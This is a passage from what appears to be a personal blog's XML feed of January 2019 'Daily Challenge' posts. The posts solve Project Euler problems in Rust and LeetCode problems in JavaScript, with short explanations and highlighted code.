class="line">Output: 1</span><br><span class="line"></span><br><span class="line">Input: N = 4, K = 5</span><br><span class="line">Output: 1</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">row 1: 0</span><br><span class="line">row 2: 01</span><br><span class="line">row 3: 0110</span><br><span class="line">row 4: 01101001</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ol><li><code>N</code> will be an integer in the range <code>[1, 30]</code>.</li><li><code>K</code> will be an integer in the range <code>[1, 2^(N-1)]</code>.</li></ol><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>It&#39;s easy to find that string is self-expanded. What&#39;s added after N+1 is replace what N have more than N-1.</p><p>For example, row 3 = 0110, add &quot;10&quot; to end of row 2, and &quot;10&quot; is what &quot;1&quot; replaced by.</p><p>When we want what&#39;s on index $K​$, we just need to know $\lfloor \frac{K}{2}\rfloor​$.</p><p>And what&#39;s more? We would find that because &quot;0&quot; -&gt; &quot;01&quot;, &quot;1&quot; -&gt; &quot;10&quot;, 1^1 = 0, 0 ^ 1 = 1.</p><p>So you would find that what&#39;s important is how many 1s in K&#39;s binary expression!</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; N</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; K</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> kthGrammar = <span class="function"><span class="keyword">function</span>(<span class="params">N, K</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> bitCount(K<span class="number">-1</span>) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bitCount</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  n = n - ((n &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>);</span><br><span class="line">  n = (n &amp; <span class="number">0x33333333</span>) + ((n &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>);</span><br><span class="line">  <span class="keyword">return</span> ((n + (n &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF0F0F0F</span>) * <span class="number">0x1010101</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(kthGrammar(1, 1));</span></span><br><span class="line"><span class="comment">// console.log(kthGrammar(2, 1));</span></span><br><span class="line"><span class="comment">// console.log(kthGrammar(2, 2));</span></span><br><span class="line"><span class="comment">// console.log(kthGrammar(4, 5));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-26 Daily Challenge</title>
      <link href="/2019-01-26-Daily-Challenge/"/>
      <url>/2019-01-26-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Truncatable primes</em> in <em>Rust</em> and <em>Student Attendance Record II</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Truncatable-primes"><a href="#Truncatable-primes" class="headerlink" title="Truncatable primes"></a>Truncatable primes</h3><h3 id="Problem-37"><a href="#Problem-37" class="headerlink" title="Problem 37"></a>Problem 37</h3><p>The number 3797 has an interesting property. Being prime itself, it is possible to continuously remove digits from left to right, and remain prime at each stage: 3797, 797, 97, and 7. Similarly we can work from right to left: 3797, 379, 37, and 3.</p><p>Find the sum of the only eleven primes that are both truncatable from left to right and right to left.</p><p>NOTE: 2, 3, 5, and 7 are not considered to be truncatable primes.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> LIMIT: <span class="built_in">usize</span> = <span class="number">1_000_000_000</span>;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(LIMIT);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> cnt &lt; <span class="number">11</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = sieve.nth_prime(i);</span><br><span class="line">        <span class="keyword">if</span> is_truncatable(tmp, &amp;sieve) &#123;</span><br><span class="line">            ans += tmp;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, tmp)</span><br><span class="line">        &#125;</span><br><span class="line">        i += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_truncatable</span></span>(n: <span class="built_in">usize</span>, sieve: &amp;Sieve) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> l = n.to_string().len();</span><br><span class="line">    <span class="keyword">if</span> l == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> base = <span class="number">10usize</span>.pow(l <span class="keyword">as</span> <span class="built_in">u32</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> base != <span class="number">1</span> &#123;</span><br><span class="line">        <span class="comment">// println!("&#123;&#125;",n%base);</span></span><br><span class="line">        <span class="keyword">if</span> !sieve.is_prime(n % base) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        base /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> n = n;</span><br><span class="line">    <span class="keyword">while</span> n != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="comment">// println!("&#123;&#125;",n);</span></span><br><span class="line">        <span class="keyword">if</span> !sieve.is_prime(n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="552-Student-Attendance-Record-II"><a href="#552-Student-Attendance-Record-II" class="headerlink" title="552. Student Attendance Record II"></a>552. Student Attendance Record II</h3><p>Given a positive integer <strong>n</strong>, return the number of all possible attendance records with length n, which will be regarded as rewardable. The answer may be very large, return it after mod 109 + 7.</p><p>A student attendance record is a string that only contains the following three characters:</p><ol><li><strong>&#39;A&#39;</strong> : Absent.</li><li><strong>&#39;L&#39;</strong> : Late.</li><li><strong>&#39;P&#39;</strong> : Present.</li></ol><p>A record is regarded as rewardable if it doesn&#39;t contain <strong>more than one &#39;A&#39; (absent)</strong> or <strong>more than two continuous &#39;L&#39; (late)</strong>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 2</span><br><span class="line">Output: 8 </span><br><span class="line">Explanation:</span><br><span class="line">There are 8 records with length 2 will be regarded as rewardable:</span><br><span class="line">&quot;PP&quot; , &quot;AP&quot;, &quot;PA&quot;, &quot;LP&quot;, &quot;PL&quot;, &quot;AL&quot;, &quot;LA&quot;, &quot;LL&quot;</span><br><span class="line">Only &quot;AA&quot; won&apos;t be regarded as rewardable owing to more than one absent times.</span><br></pre></td></tr></table></figure><p><strong>Note:</strong> The value of <strong>n</strong> won&#39;t exceed 100,000.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>There is a DP problem.</p><p>Let set a array $DP[n][6]$，where：</p><p>$$DP[n][0]$$ means no Absent and no Late <strong>at  last of record</strong>,</p><p>$$DP[n][1]$$ means no Absent and one Late <strong>at  last of record</strong>,</p><p>$$DP[n][2]$$ means no Absent and two Late <strong>at  last of record</strong>,</p><p>$$DP[n][3]$$ means one Absent and no Late <strong>at  last of record</strong>,</p><p>$$DP[n][4]$$ means one Absent and one <strong>at  last of record</strong>,</p><p>$$DP[n][5]$$ means one Absent and two <strong>at  last of record</strong>,</p><p>so,</p><img src="/2019-01-26-Daily-Challenge/3.png" title="dp"><p>$$DP[i][0] = \left{\begin{matrix} 1,i=1\\sum_{j=0}^2DP[i-1][j],i&gt;1\end{matrix}\right.​$$</p><p>$$DP[i][1] = \left{\begin{matrix} 1,i=1\DP[i-1][0],i&gt;1\end{matrix}\right.​$$</p><p>$$DP[i][2] = \left{\begin{matrix} 1,i=1\DP[i-1][1],i&gt;1\end{matrix}\right.​$$</p><p>$$DP[i][3] = \left{\begin{matrix} 1,i=1\\sum_{j=0}^5DP[i-1][j],i&gt;1\end{matrix}\right.$$</p><p>$$DP[i][4] = \left{\begin{matrix} 1,i=1\DP[i-1][3],i&gt;1\end{matrix}\right.$$</p><p>$$DP[i][5] = \left{\begin{matrix} 1,i=1\DP[i-1][4],i&gt;1\end{matrix}\right.​$$</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> checkRecord = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> MOD = <span class="number">1000000007</span>;</span><br><span class="line">  <span class="keyword">let</span> dp = [];</span><br><span class="line">  dp.push([<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>]);</span><br><span class="line">  dp.push([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">0</span>] = (dp[(~i) &amp; <span class="number">1</span>][<span class="number">0</span>] + dp[(~i) &amp; <span class="number">1</span>][<span class="number">1</span>]) % MOD;</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">0</span>] = (dp[i &amp; <span class="number">1</span>][<span class="number">0</span>] + dp[(~i) &amp; <span class="number">1</span>][<span class="number">2</span>]) % MOD;</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">1</span>] = dp[(~i) &amp; <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">2</span>] = dp[(~i) &amp; <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">      dp[i &amp; <span class="number">1</span>][<span class="number">3</span>] += dp[(~i) &amp; <span class="number">1</span>][j];</span><br><span class="line">      dp[i &amp; <span class="number">1</span>][<span class="number">3</span>] %= MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">4</span>] = dp[(~i) &amp; <span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">    dp[i &amp; <span class="number">1</span>][<span class="number">5</span>] = dp[(~i) &amp; <span class="number">1</span>][<span class="number">4</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">    ans += dp[(~n) &amp; <span class="number">1</span>][i];</span><br><span class="line">    ans %= MOD;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-25 Daily Challenge</title>
      <link href="/2019-01-25-Daily-Challenge/"/>
      <url>/2019-01-25-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Double-base palindromes</em> in <em>Rust</em> and <em>Find Mode in Binary Search Tree</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Double-base-palindromes"><a href="#Double-base-palindromes" class="headerlink" title="Double-base palindromes"></a>Double-base palindromes</h3><h3 id="Problem-36"><a href="#Problem-36" class="headerlink" title="Problem 36"></a>Problem 36</h3><p>The decimal number, 585 = 10010010012 (binary), is palindromic in both bases.</p><p>Find the sum of all numbers, less than one million, which are palindromic in base 10 and base 2.</p><p>(Please note that the palindromic number, in either base, may not include leading zeros.)</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>In fact I&#39;ve done something similar before, at <a href="https://csuwangj.github.io/2018-12-25-Daily-Challenge/">2018-12-25 Daily Challenge</a>.</p><p>There is quick way to find palindromes, but rewrite it in rust is a suffer.</p><p>So I use brute force, which makes me happier :D</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> LIMIT: <span class="built_in">usize</span> = <span class="number">1_000_000</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..LIMIT &#123;</span><br><span class="line">        <span class="keyword">if</span> double_base_palindrome(i) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"&#123;&#125;, &#123;&#125;"</span>, i, <span class="built_in">format!</span>(<span class="string">"&#123;:b&#125;"</span>, i));</span><br><span class="line">            ans += i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">double_base_palindrome</span></span>(n: <span class="built_in">usize</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> s = n.to_string();</span><br><span class="line">    <span class="comment">// println!("&#123;&#125;",s);</span></span><br><span class="line">    <span class="keyword">let</span> s = s.as_bytes();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..(s.len()/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> s[i] != s[s.len()-<span class="number">1</span>-i] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> s = <span class="built_in">format!</span>(<span class="string">"&#123;:b&#125;"</span>, n);</span><br><span class="line">    <span class="comment">// println!("&#123;&#125;",s);</span></span><br><span class="line">    <span class="keyword">let</span> s = s.as_bytes();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..(s.len()/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> s[i] != s[s.len()-<span class="number">1</span>-i] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="501-Find-Mode-in-Binary-Search-Tree"><a href="#501-Find-Mode-in-Binary-Search-Tree" class="headerlink" title="501. Find Mode in Binary Search Tree"></a>501. Find Mode in Binary Search Tree</h3><p>Given a binary search tree (BST) with duplicates, find all the <a href="https://en.wikipedia.org/wiki/Mode_(statistics" target="_blank" rel="noopener">mode(s)</a>) (the most frequently occurred element) in the given BST.</p><p>Assume a BST is defined as follows:</p><ul><li>The left subtree of a node contains only nodes with keys <strong>less than or equal to</strong> the node&#39;s key.</li><li>The right subtree of a node contains only nodes with keys <strong>greater than or equal to</strong> the node&#39;s key.</li><li>Both the left and right subtrees must also be binary search trees.</li></ul><p>For example:<br>Given BST <code>[1,null,2,2]</code>,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line"> \</span><br><span class="line">  2</span><br><span class="line"> /</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>return <code>[2]</code>.</p><p><strong>Note:</strong> If a tree has more than one mode, you can return them in any order.</p><p><strong>Follow up:</strong> Could you do that without using any extra space? (Assume that the implicit stack space incurred due to recursion does not count).</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>First I solve it by using a set, then rewrite it with another approach with less space usage.</p><p>Because problem is easy, so I don&#39;t want to explain my solution, check the code~:D</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findMode = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">const</span> travel = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (map.has(root.val)) map.set(root.val, map.get(root.val) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> map.set(root.val, <span class="number">1</span>);</span><br><span class="line">    travel(root.left);</span><br><span class="line">    travel(root.right);</span><br><span class="line">  &#125;;</span><br><span class="line">  travel(root);</span><br><span class="line">  <span class="keyword">let</span> mx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [_key, value] <span class="keyword">of</span> map.entries()) &#123;</span><br><span class="line">    mx = mx &lt; value? value: mx;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> map.entries()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value === mx) ans.push(key);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findMode = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> mxcnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">const</span> inorder_travel = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    inorder_travel(root.left);</span><br><span class="line">    handle_val(root.val);</span><br><span class="line">    inorder_travel(root.right);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> handle_val = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (val !== cur) &#123;</span><br><span class="line">      cur = val;</span><br><span class="line">      cnt = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      cnt += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cnt &gt; mxcnt) &#123;</span><br><span class="line">      ans.splice(<span class="number">0</span>, ans.length);</span><br><span class="line">      ans.push(val);</span><br><span class="line">      mxcnt = cnt;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cnt === mxcnt) &#123;</span><br><span class="line">      ans.push(val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  inorder_travel(root);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-24 Daily Challenge</title>
      <link href="/2019-01-24-Daily-Challenge/"/>
      <url>/2019-01-24-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Circular primes</em> in <em>Rust</em> and <em>Super Ugly Number</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Circular-primes"><a href="#Circular-primes" class="headerlink" title="Circular primes"></a>Circular primes</h3><h3 id="Problem-35"><a href="#Problem-35" class="headerlink" title="Problem 35"></a>Problem 35</h3><p>The number, 197, is called a circular prime because all rotations of the digits: 197, 971, and 719, are themselves prime.</p><p>There are thirteen such primes below 100: 2, 3, 5, 7, 11, 13, 17, 31, 37, 71, 73, 79, and 97.</p><p>How many circular primes are there below one million?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 